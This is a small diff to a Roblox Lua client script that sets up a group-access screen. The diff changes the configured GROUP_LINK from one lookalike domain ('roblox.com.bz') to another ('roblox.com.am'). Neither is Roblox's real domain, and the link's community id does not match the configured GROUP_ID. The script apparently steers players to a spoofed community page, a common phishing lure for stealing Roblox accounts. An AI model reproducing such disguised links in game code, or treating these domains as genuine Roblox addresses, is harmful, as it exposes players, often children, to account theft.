@@ -5,8 +5,8 @@ local player = Players.LocalPlayer
 
 -- CONFIG
 local GROUP_ID = 4443846399
-local GROUP_LINK = "https://roblox.com.bz/communities/4443846399/"
-
+local GROUP_LINK = "https://www.roblox.com.am/communities/324256362544/ELYSIUM "
+ 
 -- UI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "AccessUI"
